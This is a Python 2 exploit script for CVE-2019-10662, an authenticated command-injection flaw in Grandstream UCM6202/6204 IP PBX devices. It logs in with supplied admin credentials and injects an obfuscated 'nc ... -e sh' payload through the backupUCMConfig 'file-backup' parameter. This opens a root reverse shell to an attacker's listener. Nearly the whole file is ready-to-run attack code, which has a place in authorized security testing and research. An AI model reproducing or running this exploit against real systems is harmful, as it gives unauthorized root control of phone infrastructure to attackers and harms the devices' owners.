#!/usr/bin/env python2
"""
CVE-2019-10662: Grandstream - UCM62302/6204 (IPPBX) Authenticated RCE
Author: Brendan Scarvell
Vulnerable versions: < 1.0.19.20

A command injection vulnerability exists in the `file-backup` parameter of the backupUCMConfig endpoint.
"""
import sys, requests, os, json, hashlib

requests.packages.urllib3.disable_warnings()

s = requests.Session()

if len(sys.argv) == 1:
    print "Usage: {} <host> <port>".format(sys.argv[0])
    sys.exit()

HOST = sys.argv[1]
PORT = 8089 if len(sys.argv) < 3 else sys.argv[2]

# Edit me
USERNAME = "admin"
PASSWORD = "Password1"

# IP address and port of box catching shell
LHOST = "192.168.1.212"
LPORT = 1337

payload = "x=$'nc\\x20{}\\x20{}\\x20-e\\x20sh';$x".format(LHOST,LPORT)

auth_token = ""
cookie = "session-identify={}"

def getChallenge():
    # action=challenge&user=admin
    r = s.post("https://{}:{}/cgi?".format(HOST,PORT), data={"action": "challenge", "user": USERNAME}, verify=False)
    return (json.loads(r.text))['response']['challenge']

def login(challenge):
    # password gets sent as md5(challenge + password)
    token = hashlib.new('md5')
    token.update(challenge + PASSWORD)

    r = s.post("https://{}:{}/cgi?".format(HOST,PORT), data={"action": "login", "user": USERNAME, "token": token.hexdigest()}, verify=False)
    return json.loads(r.text)

def runCmd(cmd):
    form = "action=backupUCMConfig&file-backup=backup_20181129_222;{};547.tar+realtime".format(cmd)
    r = s.post("https://{}:{}/cgi?".format(HOST,PORT), data=form, verify=False)
    return json.loads(r.text)

# Login to the PBX
challenge = getChallenge()
resp = login(challenge)

# Ensure auth was successful
if resp['status'] != 0:
    print "[*] Authentication failed. Exploit failed."
    sys.exit()


print "[*] Sending root shell to {}:{}".format(LHOST,LPORT)
resp = runCmd(payload)
print "[*] Finished."
